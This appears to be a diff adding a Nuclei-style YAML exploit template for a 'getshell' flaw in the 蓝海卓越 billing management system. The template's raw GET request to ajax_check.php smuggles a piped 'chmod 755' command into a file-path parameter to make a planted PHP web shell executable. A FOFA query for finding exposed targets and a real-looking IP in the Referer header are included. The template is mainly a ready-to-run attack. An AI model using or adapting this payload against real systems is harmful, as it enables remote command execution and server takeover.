@@ -1,0 +1,39 @@
+id: poc-4a1169157ea77c9995eb
+info:
+  name: 蓝海卓越计费管理系统多漏洞导致getshell
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4a1169157ea77c9995eb5a905afb3740
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 4a1169157ea77c9995eb5a905afb3740
+    fofa: + fofa`title=="蓝海卓越计费管理系统"`
+http:
+- raw:
+  - 'GET /ajax_check.php?portaltheme_del_id=4&portaltheme_del_dir=%2Fmnt%2Fmysql%2Fusr%2Flocal%2Fportal%2Fthemes%2F20210519093903_738%2F|chmod+755+/usr/local/usr-gui/test.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    DNT: 1
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
+
+    Referer: http://124.114.151.106:8880/portaltheme_list.php
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: mylang=zh_s; PHPSESSID=lp91fvnja6f987dj7jmkjh5601
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
